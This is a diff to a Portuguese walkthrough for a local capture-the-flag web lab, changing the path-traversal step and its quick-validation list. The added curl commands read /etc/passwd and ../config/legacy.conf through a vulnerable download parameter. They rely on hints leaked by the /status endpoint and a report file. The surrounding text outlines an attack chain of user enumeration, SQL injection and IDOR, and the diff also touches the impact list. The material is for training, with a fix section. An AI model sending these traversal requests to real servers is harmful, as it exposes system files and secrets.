@@ -349,10 +349,39 @@ O `robots.txt` revelou `/download`. Teste primeiro um arquivo esperado:
 curl -i "http://localhost:8088/download?file=public-info.txt"
 ```
 
-Depois teste o traversal controlado:
+Esse teste prova a funcionalidade normal do downloader legado.
+
+Como `/backup` lista relatorios disponiveis, leia tambem o relatorio de Q2 pelo downloader:
 
 ```bash
-curl -i "http://localhost:8088/download?file=../../../../flags/final.txt"
+curl -i "http://localhost:8088/download?file=report-q2.txt"
+```
+
+Observe a pista operacional:
+
+```text
+Durante a migracao, a configuracao antiga foi movida para o diretorio config.
+Arquivo revisado pela equipe: legacy.conf
+```
+
+Depois prove a leitura fora do diretorio permitido lendo um arquivo conhecido do sistema:
+
+```bash
+curl -i "http://localhost:8088/download?file=../../../../etc/passwd"
+```
+
+O retorno deve conter linhas tipicas como `root:x:0:0:root`.
+
+Volte ao vazamento de `/status` e observe o caminho interno:
+
+```json
+"internal_path": "/usr/src/app"
+```
+
+Como o downloader parte de `/usr/src/app/files`, a pista `config` + `legacy.conf` aponta para um arquivo legado dentro da aplicacao, acessivel voltando um diretorio:
+
+```bash
+curl -i "http://localhost:8088/download?file=../config/legacy.conf"
 ```
 
 Flag:
@@ -368,6 +397,7 @@ Impacto:
 - leitura de arquivo fora do diretorio esperado
 - vazamento de segredos
 - exposicao de configuracoes internas no container
+- descoberta de caminhos reais a partir de endpoints verbosos como `/status`
 
 Correcao:
 
@@ -388,7 +418,9 @@ Correcao:
 8. Enumerar usuarios por mensagens diferentes no login
 9. Explorar login com SQL Injection
 10. Acessar contas e explorar IDOR
-11. Explorar `/download?file=` com path traversal
+11. Ler `report-q2.txt` e identificar a pista `config` + `legacy.conf`
+12. Provar Path Traversal com `/etc/passwd`
+13. Usar `internal_path=/usr/src/app` para ler `../config/legacy.conf`
 
 ## 11. Validacao rapida
 
@@ -402,7 +434,9 @@ curl -i http://localhost:8088/dev.txt
 curl -i -X POST http://localhost:8088/login -d "username=naoexiste" -d "password=teste"
 curl -i -X POST http://localhost:8088/login -d "username=joao" -d "password=errada"
 curl -i "http://localhost:8088/download?file=public-info.txt"
-curl -i "http://localhost:8088/download?file=../../../../flags/final.txt"
+curl -i "http://localhost:8088/download?file=report-q2.txt"
+curl -i "http://localhost:8088/download?file=../../../../etc/passwd"
+curl -i "http://localhost:8088/download?file=../config/legacy.conf"
 ```
 
 Valide as flags no repositorio usando o comando documentado em `../VALIDATION.md`.
